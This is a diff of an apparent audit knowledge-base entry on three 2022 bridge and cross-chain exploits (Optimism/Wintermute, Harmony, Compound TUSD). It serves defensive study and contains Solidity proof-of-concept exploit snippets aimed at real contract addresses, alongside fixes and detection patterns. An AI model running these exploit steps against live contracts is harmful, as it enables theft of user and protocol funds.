@@ -1,33 +1,69 @@
 ---
-protocol: Multi-Protocol
-chain: Ethereum, Optimism, Harmony
+# Core Classification
+protocol: generic
+chain: ethereum, optimism, harmony
 category: bridge
-vulnerability_type: Bridge and Cross-Chain Security Patterns
-attack_type:
-  - Cross-chain address collision via CREATE nonce replay
-  - Compromised multisig keys with low threshold
-  - Token proxy dual-address bypass
-source: DeFiHackLabs
-total_exploits_analyzed: 3
-total_losses: "$115M+"
-affected_component:
-  - L2 bridge deposits
-  - Cross-chain multisig wallets
-  - Bridge token lockers
-  - Compound sweep functions
-  - Proxy token addressing
+vulnerability_type: cross_chain_identity_and_custody
+
+# Pattern Identity
+root_cause_family: identity_and_custody_assumption
+pattern_key: cross_chain_identity_mismatch | deployment_or_custody | deterministic_address_or_threshold | fund_loss
+
+# Interaction Scope
+interaction_scope: cross_chain
+involved_contracts:
+  - ProxyFactory
+  - GnosisSafe
+  - MultiSigWallet
+  - BridgeLocker
+  - cTUSD
+  - TUSD_Legacy
+  - TUSD_Current
+path_keys:
+  - create_nonce_collision | ProxyFactory.createProxy | ProxyFactory -> GnosisSafe (L2 address claim)
+  - low_multisig_threshold | MultiSigWallet.submitTransaction | MultiSigWallet -> BridgeLocker.unlockToken
+  - token_proxy_dual_address | cTUSD.sweepToken | cTUSD -> TUSD_Legacy.delegatecall -> TUSD_Current
+
+# Attack Vector Details
+attack_type: logical_error
+affected_component: cross_chain_deployment, multisig_custody, token_identity
+
+# Technical Primitives
 primitives:
-  - cross_chain
   - address_collision
-  - multisig_compromise
-  - proxy_bypass
-  - token_sweep
-severity: CRITICAL
-impact: Full bridge drain, token theft, address takeover
-exploitability: Medium to High
-financial_impact: "$115M+ aggregate"
+  - create_nonce_determinism
+  - create2
+  - multisig_threshold
+  - key_compromise
+  - token_proxy_bypass
+  - delegatecall_forwarding
+  - sweep_guard
+
+# Grep / Hunt-Card Seeds
+code_keywords:
+  - createProxy
+  - create2
+  - CREATE
+  - nonce
+  - submitTransaction
+  - confirmTransaction
+  - required
+  - threshold
+  - sweepToken
+  - recoverToken
+  - rescueToken
+  - underlying
+  - delegatecall
+  - fallback
+
+# Impact Classification
+severity: critical
+impact: fund_loss
+exploitability: 0.6
+financial_impact: critical
+
+# Context Tags
 tags:
-  - defihacklabs
   - bridge
   - cross-chain
   - l2-replay
@@ -38,227 +74,241 @@ tags:
   - token-proxy
   - dual-address
   - sweep-bypass
-  - harmony
-  - optimism-wintermute
-  - compound-tusd
+  - DeFiHackLabs
+
+# Version Info
+language: solidity
+version: ">=0.6.0"
 ---
 
-# DeFiHackLabs Bridge & Cross-Chain Security Patterns (2022)
+## References & Source Reports
+
+| Label | Source | Path / URL | Severity | Loss |
+|-------|--------|------------|----------|------|
+| [OPT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-06/Optimism_exp.sol` | CRITICAL | $15M |
+| [HAR-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-06/Harmony_multisig_exp.sol` | CRITICAL | $100M |
+| [CTUSD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-03/CompoundTusd_exp.sol` | CRITICAL | Full Market |
+
+---
+
+# Bridge & Cross-Chain Identity / Custody Patterns (2022)
 
 ## Overview
 
-This entry catalogs 3 high-profile cross-chain and bridge-related exploits from 2022 sourced from [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs). These represent the most impactful class of vulnerabilities in 2022, with combined losses exceeding $115M.
+Three high-profile exploits from 2022 totaling **$115M+** that share a common theme: cross-chain and cross-contract identity assumptions fail when the mapping between addresses, keys, or token proxies is not consistent across execution contexts. (1) CREATE nonce replay allows claiming a Gnosis Safe address on L2 before the owner deploys (Optimism/Wintermute $15M), (2) a 2-of-5 multisig threshold means compromising 40% of keys grants full bridge control (Harmony $100M), and (3) a token's legacy proxy address bypasses an identity check that only compares against the current address (Compound TUSD — full cTUSD market).
 
-**Categories covered:**
-1. **Cross-Chain Address Collision** — CREATE nonce replay to steal L2 deposits ($15M)
-2. **Bridge Multisig Key Compromise** — Insufficient signing threshold enables drain ($100M)
-3. **Token Proxy Dual-Address Bypass** — Legacy proxy address bypasses sweep guard (full market)
+### Agent Quick View
+
+- Root cause statement: "This vulnerability exists because cross-chain deployments rely on CREATE nonce determinism without chain-specific salt (Optimism), bridge multisig thresholds are too low relative to the value secured (Harmony), or token identity checks only compare a single address without accounting for proxy aliases (Compound TUSD)."
+- Pattern key: `cross_chain_identity_mismatch | deployment_or_custody | deterministic_address_or_threshold | fund_loss`
+- Interaction scope: `cross_chain`
+- Primary affected component(s): `proxy factory deployment, multisig custody, token sweep guard`
+- Contracts / modules involved: `ProxyFactory, GnosisSafe, MultiSigWallet, BridgeLocker, cTUSD, TUSD_Legacy`
+- Path keys: `create_nonce_collision | ProxyFactory.createProxy | ProxyFactory -> GnosisSafe`; `low_multisig_threshold | MultiSigWallet.submitTransaction | MultiSigWallet -> BridgeLocker.unlockToken`; `token_proxy_dual_address | cTUSD.sweepToken | cTUSD -> TUSD_Legacy -> TUSD_Current`
+- High-signal code keywords: `createProxy, create2, submitTransaction, confirmTransaction, required, sweepToken, underlying, delegatecall, fallback`
+- Typical sink / impact: `L2 deposit theft, complete bridge drain, underlying token sweep`
+- Validation strength: `strong`
+
+### Contract / Boundary Map
+
+- Entry surface(s): `ProxyFactory.createProxy()`, `MultiSigWallet.submitTransaction()`, `cTUSD.sweepToken()`
+- Contract hop(s): `ProxyFactory -> new proxy (CREATE, increments nonce) -> address match`; `MultiSigWallet.submit -> MultiSigWallet.confirm -> BridgeLocker.unlockToken`; `cTUSD.sweepToken -> TUSD_Legacy.transfer -> delegatecall -> TUSD_Current.transfer`
+- Trust boundary crossed: `L1 address assumption → L2 deployment counterfactual`; `multisig threshold → bridge locker`; `token identity check → proxy delegation`
+- Shared state or sync assumption: `L1 safe address exists at the same address on L2 upon deployment`; `2 of 5 keys cannot be simultaneously compromised`; `underlying token has exactly one address`
+
+### Valid Bug Signals
+
+- Signal 1: Funds sent to an L2 address where no contract has been deployed yet, and the address is CREATE-deterministic (not CREATE2)
+- Signal 2: Bridge multisig threshold is < 60% of total signers and no time delay exists on large transfers
+- Signal 3: Token sweep guard compares `token != underlying` using only the current proxy address, but the token has a legacy proxy address that delegates to the same implementation
+
+### False Positive Guards
+
+- Not this bug when: Cross-chain deployments use CREATE2 with chain-specific salt (address is deterministic from salt, not nonce)
+- Safe if: Multisig threshold >= 60% of signers AND has mandatory time delay for large operations
+- Safe if: Sweep guard checks against ALL known token addresses (current + legacy + aliases) or verifies underlying balance is unchanged post-sweep
+- Requires attacker control of: ProxyFactory.createProxy() on L2 (public, Path A), two private keys (Path B), or cTUSD.sweepToken (admin-gated, but was callable — Path C)
 
 ---
 
 ## Vulnerability Description
 
-### Root Cause Analysis
+### Root Cause
 
-Bridge and cross-chain vulnerabilities differ from standard DeFi exploits because they span multiple execution environments:
+Three vulnerabilities exploiting identity assumptions in cross-chain and cross-contract contexts:
 
-1. **Address Determinism Across Chains**: Addresses created via `CREATE` are deterministic (deployer + nonce). If a contract exists at address X on L1 but hasn't been deployed on L2, an attacker can deploy at the same address on L2 by replaying proxy factory calls until the nonce matches. (Optimism/Wintermute — $15M)
+1. **CREATE nonce determinism across chains (Optimism/Wintermute)**: Addresses created via `CREATE` are deterministic: `keccak256(rlp([deployer, nonce]))`. If a Gnosis Safe exists at address X on L1 via a ProxyFactory, the same address can be claimed on L2 by calling `createProxy()` until the factory nonce produces the same address. The attacker then controls the proxy at that L2 address and drains any tokens sent to it.
 
-2. **Insufficient Multisig Threshold**: A 2-of-5 signing threshold means compromising just 2 keys (40%) gives full bridge control. On-chain bridges holding $100M+ should require higher thresholds (e.g., 4-of-7 or 5-of-9) with diverse key custody. (Harmony — $100M)
+2. **Insufficient multisig threshold (Harmony)**: The Harmony bridge used a 2-of-5 multisig wallet. Compromising just 2 keys (40%) gave full control to submit and confirm arbitrary token unlock transactions, draining $100M across USDT, ETH, WBTC, USDC, and DAI.
 
-3. **Token Identity Confusion via Proxy Patterns**: Some tokens (e.g., TUSD) use a proxy pattern where a legacy address delegates to the current implementation. If a protocol checks `token != underlying` using only the current address, the legacy address passes the check while still operating on the same token. (Compound TUSD — full cTUSD market)
+3. **Token proxy dual-address identity confusion (Compound TUSD)**: TUSD uses a proxy pattern where a legacy address (`0x8dd5...`) delegates all calls to the current implementation (`0x0000...`). Compound's `sweepToken` function guards against sweeping the underlying by checking `token != underlying`, but only uses the current address. The legacy address passes this check while any `transfer()` call on it delegates to the real TUSD — effectively sweeping the underlying.
 
-### Attack Scenarios
+### Attack Scenario / Path Variants
 
-**Scenario 1: Cross-Chain Address Collision (Optimism/Wintermute)**
-```
+**Path A: Cross-Chain Address Collision via CREATE Nonce Replay (Optimism/Wintermute — $15M)** [CRITICAL]
+Path key: `create_nonce_collision | ProxyFactory.createProxy | ProxyFactory -> GnosisSafe (L2 address claim)`
+Entry surface: `ProxyFactory.createProxy(address masterCopy, bytes data)` — callable by anyone
+Contracts touched: `ProxyFactory -> new GnosisSafeProxy (CREATE)`
+Boundary crossed: `L1 address assumption → L2 CREATE nonce race`
+pathShape: `iterative-loop`
+
 1. Wintermute receives 20M OP tokens on Optimism to their L1 Gnosis Safe address
-2. The Gnosis Safe has NOT been deployed on Optimism yet
-3. Attacker calls ProxyFactory.createProxy() repeatedly on Optimism
-4. Each call increments the factory nonce → deterministic CREATE address changes
-5. Eventually, the created proxy address matches Wintermute's expected address
-6. Attacker now controls a contract at that address → drains 20M OP tokens
-```
+2. The Gnosis Safe has NOT been deployed on Optimism yet — funds sit at an uncontrolled address
+3. Attacker calls `ProxyFactory.createProxy(masterCopy, "0x")` in a loop on Optimism
+4. Each call increments the factory's nonce → deterministic CREATE address shifts
+5. When `keccak256(rlp([proxyFactory, current_nonce]))[12:]` matches the target, attacker controls the new proxy
+6. Attacker now controls a contract at the target address → calls to drain 20M OP tokens ($15M)
 
-**Scenario 2: Compromised Bridge Multisig (Harmony)**
-```
+**Path B: Compromised Multisig Keys with Low Threshold (Harmony — $100M)** [CRITICAL]
+Path key: `low_multisig_threshold | MultiSigWallet.submitTransaction | MultiSigWallet -> BridgeLocker.unlockToken`
+Entry surface: `MultiSigWallet.submitTransaction(address dest, uint value, bytes data)` — callable by owner
+Contracts touched: `MultiSigWallet -> BridgeLocker.unlockToken`
+Boundary crossed: `multisig threshold → bridge locker custody`
+pathShape: `linear-multistep`
+
 1. Harmony bridge uses a 2-of-5 multisig to authorize token unlocks
-2. Attacker compromises 2 of 5 private keys
-3. Attacker calls submitTransaction(unlockToken(USDT, 9.98M, attacker))
-4. Attacker calls confirmTransaction with second key → meets 2-of-5 threshold
-5. Transaction auto-executes → 9.98M USDT unlocked to attacker
-6. Repeat for other tokens → ~$100M total
-```
+2. Attacker compromises 2 of 5 private keys (0xf845A7 and 0x812d86)
+3. First key calls `submitTransaction(BridgeLocker, 0, unlockToken(USDT, 9.98M, attacker))` — creates pending tx
+4. Second key calls `confirmTransaction(txId)` — meets 2-of-5 threshold → auto-executes
+5. 9.98M USDT unlocked to attacker
+6. Repeat for ETH, WBTC, USDC, DAI → ~$100M total
 
-**Scenario 3: Token Proxy Dual-Address Bypass (Compound TUSD)**
-```
-1. cTUSD market has sweepToken() to recover accidentally-sent tokens
-2. Guard: require(token != underlying) prevents sweeping TUSD directly
-3. TUSD has a legacy address (0x8dd5...) that delegates to current TUSD (0x0000...)
-4. Attacker calls sweepToken(tusdLegacy)
-5. Guard passes: tusdLegacy != underlying (different addresses)
-6. But tusdLegacy.transfer() delegates to real TUSD → sweeps all TUSD from cTUSD market
-```
+**Path C: Token Proxy Dual-Address Bypass on Sweep Function (Compound TUSD — Full Market)** [CRITICAL]
+Path key: `token_proxy_dual_address | cTUSD.sweepToken | cTUSD -> TUSD_Legacy.delegatecall -> TUSD_Current`
+Entry surface: `cTUSD.sweepToken(EIP20NonStandardInterface token)` — admin-callable
+Contracts touched: `cTUSD -> TUSD_Legacy (fallback) -> delegatecall -> TUSD_Current.transfer`
+Boundary crossed: `token identity check (single address) → proxy delegation (multiple addresses for same token)`
+pathShape: `atomic`
 
----
+1. cTUSD market has `sweepToken()` to recover accidentally-sent tokens
+2. Guard: `require(address(token) != underlying)` prevents sweeping TUSD directly
+3. TUSD has a legacy address (`0x8dd5...`) that delegates all calls to current TUSD (`0x0000...`)
+4. Call `sweepToken(tusdLegacy)` — guard passes: `tusdLegacy != underlying` (different addresses!)
+5. But `tusdLegacy.transfer()` → `fallback() { currentTUSDProxy.delegatecall(msg.data) }` → real TUSD transfer
+6. Result: ALL TUSD balance drained from the cTUSD market
 
-## Vulnerable Pattern Examples
+### Vulnerable Pattern Examples
 
-### Pattern 1: Cross-Chain Address Collision via CREATE Nonce Replay
-
-**Severity**: 🔴 CRITICAL | **Loss**: 20M OP (~$15M) | **Protocol**: Optimism/Wintermute | **Chain**: Optimism
-
-Addresses created via `CREATE` opcode are deterministic: `keccak256(rlp([deployer, nonce]))`. If a Gnosis Safe exists at address X on L1 via the `ProxyFactory`, the same address can be claimed on L2 by replaying `createProxy` calls until the factory's nonce produces the same address.
+**Example 1: Optimism — CREATE Nonce Address Collision ($15M)** [Approx Vulnerability: CRITICAL] `@audit` [OPT-POC]
 
 ```solidity
-// @audit-issue CREATE address is deterministic — attacker replays until match
+// ❌ VULNERABLE: CREATE address is deterministic — attacker replays until match
+// address = keccak256(rlp([proxyFactory, nonce]))[12:]
+
 contract OptimismExploit {
     address public childcontract;
-    address constant TARGET = 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81;
-    
+    ProxyFactory proxy = ProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
+
     function testExploit() public {
-        // @audit Brute-force proxy creation until address matches target
-        while (childcontract != TARGET) {
+        // @audit Brute-force proxy creation until address matches Wintermute's L1 safe
+        while (childcontract != 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) {
             childcontract = proxy.createProxy(
                 0xE7145dd6287AE53326347f3A6694fCf2954bcD8A, // master copy
                 "0x"  // empty initializer
             );
         }
-        // @audit childcontract == TARGET → attacker controls the proxy
-        // All 20M OP tokens sent to this address are now accessible
+        // @audit childcontract == target → attacker controls the proxy at that address
+        // All 20M OP tokens ($15M) sent to this address are now accessible
     }
 }
-
-// The deterministic address formula:
-// address = keccak256(rlp([proxyFactory, nonce]))[12:]
-// By creating proxies until nonce matches L1's deployment nonce,
-// attacker gets the same address on L2
 ```
 
-**Reference**: [DeFiHackLabs/src/test/2022-06/Optimism_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Optimism_exp.sol) | Block: 10,607,735 (Optimism)
-
----
-
-### Pattern 2: Compromised Multisig Keys with Low Threshold
-
-**Severity**: 🔴 CRITICAL | **Loss**: ~$100M | **Protocol**: Harmony Horizon Bridge | **Chain**: Ethereum
-
-The Harmony bridge used a 2-of-5 multisig wallet to authorize cross-chain token unlocks. Compromising just 2 private keys (40% of signers) was sufficient to drain the entire bridge.
+**Example 2: Harmony — 2-of-5 Multisig Key Compromise ($100M)** [Approx Vulnerability: CRITICAL] `@audit` [HAR-POC]
 
 ```solidity
-// @audit-issue 2-of-5 threshold — compromising 2 keys drains the bridge
+// ❌ VULNERABLE: 2-of-5 threshold — compromising 40% of keys drains entire bridge
+
 function testExploit() public {
-    address compromisedKey1 = 0xf845A7ee8477AD1FB4446651E548901a2635A915;
-    address compromisedKey2 = 0x812d8622C6F3c45959439e7ede3C580dA06f8f25;
-    
-    // Encode the bridge unlock message
-    bytes memory unlockPayload = abi.encodeWithSignature(
-        "unlockToken(address,uint256,address,bytes32)",
-        address(USDT),        // token to unlock
-        9_981_000_000_000,    // 9.98M USDT
-        address(attacker),    // recipient
-        receiptId             // fake receipt ID
-    );
-    
-    // @audit Submit unlock transaction with first compromised key
-    cheat.prank(compromisedKey1);
+    // Encode bridge unlock: unlockToken(USDT, 9.98M, attacker)
+    bytes memory msgP1 = hex"fe7f61ea000000000000000000000000"
+                         hex"dac17f958d2ee523a2206206994597c13d831ec7"  // USDT
+                         hex"00000000000000000000000000000000000000000000000000000913e1f5a200"
+                         hex"000000000000000000000000";
+    bytes memory recipient = abi.encodePacked(address(this));
+    bytes memory receiptId = hex"d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6";
+    bytes memory _message = bytes.concat(msgP1, recipient, receiptId);
+
+    // @audit First compromised key submits the unlock transaction
+    cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);
     uint256 txId = MultiSigWallet.submitTransaction(
         0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857,  // bridge locker
-        0,
-        unlockPayload
+        0, _message
     );
-    
-    // @audit Confirm with second compromised key → meets 2-of-5 threshold
-    // Transaction auto-executes → 9.98M USDT drained
-    cheat.prank(compromisedKey2);
+
+    // @audit Second compromised key confirms → meets 2/5 threshold → auto-executes
+    cheat.prank(0x812d8622C6F3c45959439e7ede3C580dA06f8f25);
     MultiSigWallet.confirmTransaction(txId);
-    
-    // @audit Repeat for ETH, WBTC, USDC, DAI → ~$100M total
+    // 9.98M USDT drained. Repeat for ETH, WBTC, USDC, DAI → ~$100M total
 }
 ```
 
-**Reference**: [DeFiHackLabs/src/test/2022-06/Harmony_multisig_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Harmony_multisig_exp.sol) | Block: 15,012,645
-
----
-
-### Pattern 3: Token Proxy Dual-Address Bypass on Sweep Function
-
-**Severity**: 🔴 CRITICAL | **Loss**: All cTUSD market balance | **Protocol**: Compound | **Chain**: Ethereum
-
-TUSD uses a proxy pattern where the legacy address (`0x8dd5...`) delegates to the current implementation (`0x0000...`). Compound's `sweepToken` checks `token != underlying` using only the current address. The legacy address passes this check while still operating on the same token.
+**Example 3: Compound TUSD — Legacy Proxy Address Bypasses Sweep Guard (Full Market)** [Approx Vulnerability: CRITICAL] `@audit` [CTUSD-POC]
 
 ```solidity
-// @audit-issue sweepToken guard checks current address only — legacy address bypasses it
+// ❌ VULNERABLE: sweepToken guard checks current address only — legacy proxy bypasses it
+
 function testExploit() public {
-    // Current TUSD proxy address (what Compound checks against)
-    address underlying = 0x0000000000085d4780B73119b644AE5ecd22b376;
-    
-    // Legacy TUSD address — delegates all calls to current proxy
-    address tusdLegacy = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;
-    
-    // @audit sweepToken internal check:
-    // require(address(token) != underlying); 
+    address underlying = 0x0000000000085d4780B73119b644AE5ecd22b376;  // Current TUSD
+    address tusdLegacy = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;  // Legacy TUSD
+
+    // @audit Guard: require(address(token) != underlying)
     // tusdLegacy != underlying → PASSES (different addresses!)
-    
-    // @audit But tusdLegacy.transfer() → forwards to real TUSD → sweeps ALL TUSD
+    // But tusdLegacy.transfer() → fallback → delegatecall to real TUSD → real transfer
     cTUSD.sweepToken(EIP20NonStandardInterface(tusdLegacy));
-    
-    // Result: All TUSD drained from Compound's cTUSD market
-    // Because tusdLegacy is just another entry point to the same token
+    // Result: ALL TUSD drained from cTUSD market
 }
 
-// Why this works:
-// Legacy TUSD contract:
+// Why this works — Legacy TUSD contract:
 // fallback() {
 //     (bool success,) = currentTUSDProxy.delegatecall(msg.data);
 // }
-// Calling tusdLegacy.transfer() → delegates to real TUSD → moves real TUSD tokens
+// Calling tusdLegacy.transfer() delegates to real TUSD → moves real TUSD tokens
 ```
-
-**Reference**: [DeFiHackLabs/src/test/2022-03/CompoundTusd_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/CompoundTusd_exp.sol) | Block: 14,266,479
 
 ---
 
 ## Impact Analysis
 
-| Protocol | Date | Loss | Root Cause | Chain |
-|----------|------|------|-----------|-------|
-| Harmony Bridge | Jun 2022 | ~$100M | 2-of-5 multisig key compromise | Ethereum |
-| Optimism/Wintermute | Jun 2022 | ~$15M | CREATE nonce address collision | Optimism |
-| Compound TUSD | Mar 2022 | Full market | Token proxy dual-address bypass | Ethereum |
+### Technical Impact
+- L2 address claims allow draining any tokens sent to undeployed L2 addresses with deterministic L1 counterparts
+- Low bridge multisig thresholds turn key compromise into complete bridge drain across all locked tokens
+- Token proxy aliases bypass sweep and identity guards, enabling extraction of protocol-held tokens
 
-**Aggregate**: Over $115M in losses from bridge and cross-chain vulnerabilities.
+### Business Impact
+
+| Protocol | Date | Loss | Root Cause |
+|----------|------|------|------------|
+| Harmony Bridge | Jun 2022 | ~$100M | 2-of-5 multisig key compromise |
+| Optimism/Wintermute | Jun 2022 | ~$15M | CREATE nonce address collision on L2 |
+| Compound TUSD | Mar 2022 | Full cTUSD market | Legacy proxy address bypasses sweep guard |
+
+**Total: $115M+** from cross-chain identity and custody assumption failures.
+
+### Affected Scenarios
+- Any protocol sending tokens to an L2 address where the contract uses CREATE (not CREATE2) for deployment
+- Bridge multisig wallets with threshold < 60% of total signers
+- Token recovery/sweep functions that compare only one address for the underlying
+- Any token using a legacy proxy that delegates to a current implementation
+- Protocols integrating tokens without checking for multiple entry points (proxy aliases)
 
 ---
 
 ## Secure Implementation
 
-### Fix 1: Use CREATE2 with Immutable Salt for Cross-Chain Deployments
-
+**Fix 1: Use CREATE2 with Chain-Specific Salt for Cross-Chain Deployments**
 ```solidity
-// SECURE: Use CREATE2 with a chain-specific salt for cross-chain deployments
+// ✅ SECURE: CREATE2 address is deterministic from (factory, salt, initCodeHash)
+// Salt includes chain ID → same address can ONLY be created by the same factory with same params
 contract SecureProxyFactory {
-    // @audit-fix CREATE2 address is deterministic from (factory, salt, initCodeHash)
-    // Salt includes chain ID → same address can ONLY be created by the same factory with same params
     function createProxyWithNonce(
-        address masterCopy,
-        bytes memory initializer,
-        uint256 saltNonce
+        address masterCopy, bytes memory initializer, uint256 saltNonce
     ) public returns (address proxy) {
-        // @audit-fix Include chain ID in salt to prevent cross-chain replay
-        bytes32 salt = keccak256(
-            abi.encodePacked(
-                keccak256(initializer),
-                saltNonce,
-                block.chainid  // Chain-specific!
-            )
-        );
-        
-        bytes memory deploymentData = abi.encodePacked(
-            proxyCreationCode,
-            uint256(uint160(masterCopy))
-        );
-        
+        bytes32 salt = keccak256(abi.encodePacked(
+            keccak256(initializer),
+            saltNonce,
+            block.chainid  // @audit Chain-specific — prevents cross-chain collision
+        ));
+        bytes memory deploymentData = abi.encodePacked(proxyCreationCode, uint256(uint160(masterCopy)));
         assembly {
             proxy := create2(0, add(deploymentData, 0x20), mload(deploymentData), salt)
         }
@@ -267,47 +317,29 @@ contract SecureProxyFactory {
 }
 ```
 
-### Fix 2: Higher Multisig Threshold + Time Delays for Bridges
-
+**Fix 2: Higher Multisig Threshold + Time Delays for Bridges**
 ```solidity
-// SECURE: Higher threshold + time locks for bridge operations
+// ✅ SECURE: Higher threshold + time locks for bridge operations
 contract SecureBridge {
-    uint256 public constant MIN_SIGNERS = 5;
-    uint256 public constant THRESHOLD = 4;  // 4-of-7 or higher
+    uint256 public constant THRESHOLD = 4;  // 4-of-7 minimum
     uint256 public constant UNLOCK_DELAY = 24 hours;
     uint256 public constant MAX_SINGLE_UNLOCK = 1_000_000e18;
-    
-    struct PendingUnlock {
-        address token;
-        uint256 amount;
-        address recipient;
-        uint256 executeAfter;
-        uint256 confirmations;
-        bool executed;
-    }
-    
+
     function submitUnlock(address token, uint256 amount, address recipient) external onlySigner {
-        // @audit-fix Large unlocks require time delay
         require(amount <= MAX_SINGLE_UNLOCK, "Exceeds single unlock limit");
-        
         pendingUnlocks[nextId] = PendingUnlock({
-            token: token,
-            amount: amount,
-            recipient: recipient,
+            token: token, amount: amount, recipient: recipient,
             executeAfter: block.timestamp + UNLOCK_DELAY,
-            confirmations: 1,
-            executed: false
+            confirmations: 1, executed: false
         });
     }
-    
+
     function confirmUnlock(uint256 id) external onlySigner {
         PendingUnlock storage unlock = pendingUnlocks[id];
         require(!hasConfirmed[id][msg.sender], "Already confirmed");
-        
         hasConfirmed[id][msg.sender] = true;
         unlock.confirmations++;
-        
-        // @audit-fix Requires 4+ confirmations AND time delay
+        // @audit Requires 4+ confirmations AND time delay
         if (unlock.confirmations >= THRESHOLD && block.timestamp >= unlock.executeAfter) {
             _executeUnlock(unlock);
         }
@@ -315,34 +347,25 @@ contract SecureBridge {
 }
 ```
 
-### Fix 3: Comprehensive Token Identity Check for Sweep
-
+**Fix 3: Comprehensive Token Identity Check for Sweep**
 ```solidity
-// SECURE: Check all known addresses for a token, not just current proxy
+// ✅ SECURE: Check ALL known addresses for a token, not just current proxy
 contract SecureCToken {
     mapping(address => bool) public knownUnderlyingAddresses;
-    
+
     function initializeUnderlyingAddresses(address[] calldata addresses) external onlyAdmin {
         for (uint i = 0; i < addresses.length; i++) {
             knownUnderlyingAddresses[addresses[i]] = true;
         }
     }
-    
+
     function sweepToken(IERC20 token) external onlyAdmin {
-        // @audit-fix Check against ALL known addresses (current + legacy + aliases)
-        require(
-            !knownUnderlyingAddresses[address(token)],
-            "Cannot sweep underlying token"
-        );
-        
-        // @audit-fix Additional check: verify token code is not a proxy to underlying
-        // Try calling the token and compare the actual transfer recipient
+        require(!knownUnderlyingAddresses[address(token)], "Cannot sweep underlying");
+        // @audit Additional check: verify underlying balance unchanged after sweep
         uint256 balBefore = IERC20(underlying).balanceOf(address(this));
         token.transfer(msg.sender, token.balanceOf(address(this)));
         uint256 balAfter = IERC20(underlying).balanceOf(address(this));
-        
-        // @audit-fix If underlying balance changed, the swept token IS the underlying
-        require(balBefore == balAfter, "Swept token is underlying via proxy");
+        require(balBefore == balAfter, "Swept token IS the underlying via proxy");
     }
 }
 ```
@@ -351,60 +374,81 @@ contract SecureCToken {
 
 ## Detection Patterns
 
-### Static Analysis
-
-```yaml
-- pattern: "createProxy|create2|CREATE"
-  check: "Verify cross-chain deployments use CREATE2 with chain-specific salt, not CREATE with sequential nonce"
-  
-- pattern: "submitTransaction|confirmTransaction|required.*=.*2"
-  check: "Verify multisig threshold is appropriate for bridge TVL (minimum 60% of signers)"
-  
-- pattern: "sweepToken|recoverToken|rescueToken"
-  check: "Verify guard checks ALL known addresses for the underlying token (current + legacy + aliases)"
-  
-- pattern: "unlockToken|relayMessage|executeMessage"
-  check: "Verify time delays exist for large unlocks and rate limiting is enforced"
-  
-- pattern: "delegatecall|fallback.*delegatecall"
-  check: "Check if token has multiple entry points (legacy proxies) that could bypass identity checks"
+### Contract / Call Graph Signals
+```
+- ProxyFactory using CREATE (sequential nonce) for cross-chain proxy deployment
+- Bridge multisig with required < 60% of owners and no time delay on execution
+- Token sweep/rescue functions that compare a single address for the underlying
+- Tokens with fallback/receive that delegatecall to another contract
 ```
 
-### Invariant Checks
-
+### High-Signal Grep Seeds
 ```
-INV-BRIDGE-001: Cross-chain contract deployment must use CREATE2 with chain-specific salt
-INV-BRIDGE-002: Bridge multisig threshold must be >= 60% of total signers
-INV-BRIDGE-003: Token identity checks must cover ALL known addresses (current proxy + legacy + aliases)
-INV-BRIDGE-004: Large bridge unlocks (>threshold) must have mandatory time delays
-INV-BRIDGE-005: Bridge must verify message origin chain and prevent cross-chain replay
-INV-BRIDGE-006: Rate limiting must bound total unlock volume per time period
+- createProxy
+- create2
+- CREATE
+- submitTransaction
+- confirmTransaction
+- required
+- sweepToken
+- recoverToken
+- rescueToken
+- underlying
+- delegatecall
+- fallback
 ```
 
----
+### Code Patterns to Look For
+```
+- ProxyFactory.createProxy with sequential nonce (not CREATE2 with salt)
+- MultiSig.required() returning < 60% of owners list
+- require(token != underlying) without checking proxies/aliases
+- Token contract with fallback() { delegatecall(currentProxy) }
+- Cross-chain fund transfers to addresses without deployed contracts
+```
 
-## Audit Checklist
-
-- [ ] **Cross-Chain Determinism**: Are contract addresses deployed via CREATE2 with chain-specific salts? Or via CREATE with replayable nonces?
-- [ ] **Multisig Threshold**: For bridges holding >$10M, is the signing threshold at least 60% of total signers? Are keys stored in diverse custody?
-- [ ] **Token Identity**: Does the protocol check all known addresses for a token? Are legacy proxy addresses accounted for?
-- [ ] **Time Delays**: Are large bridge operations subject to mandatory time delays?
-- [ ] **Rate Limiting**: Is there a per-period cap on bridge unlock volume?
-- [ ] **Key Rotation**: Are bridge signer keys regularly rotated? Are compromised keys revokable?
-- [ ] **Sweep Guards**: Do token recovery functions check against proxy aliases and delegate targets?
+### Audit Checklist
+- [ ] Do cross-chain deployments use CREATE2 with chain-specific salt? Or CREATE with replayable nonces?
+- [ ] Is the multisig threshold at least 60% of total signers?
+- [ ] Are bridge unlock operations subject to mandatory time delays?
+- [ ] Does the sweep guard check ALL known addresses for the underlying (current + legacy + aliases)?
+- [ ] Does the protocol check if tokens have proxy aliases that delegate to the same implementation?
+- [ ] Is there a rate limit on bridge unlock volume?
+- [ ] Are bridge signer keys regularly rotated and stored in diverse custody?
 
 ---
 
 ## Real-World Examples
 
-| Protocol | Date | Loss | TX/Reference |
-|----------|------|------|-------------|
-| Harmony Horizon Bridge | Jun 2022 | ~$100M | [Etherscan](https://etherscan.io/address/0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6) |
-| Optimism/Wintermute | Jun 2022 | ~$15M (20M OP) | Block 10,607,735 (Optimism) |
-| Compound TUSD | Mar 2022 | Full cTUSD market | Block 14,266,479 |
+### Known Exploits
+- **Optimism/Wintermute** — CREATE nonce replay claims L2 address before legitimate owner — Jun 2022 — $15M
+  - Link: https://rekt.news/wintermute-rekt/
+  - Root cause: L1 Gnosis Safe address was CREATE-deterministic; attacker replayed createProxy on L2
+- **Harmony Horizon Bridge** — 2-of-5 multisig key compromise → bridge drain — Jun 2022 — $100M
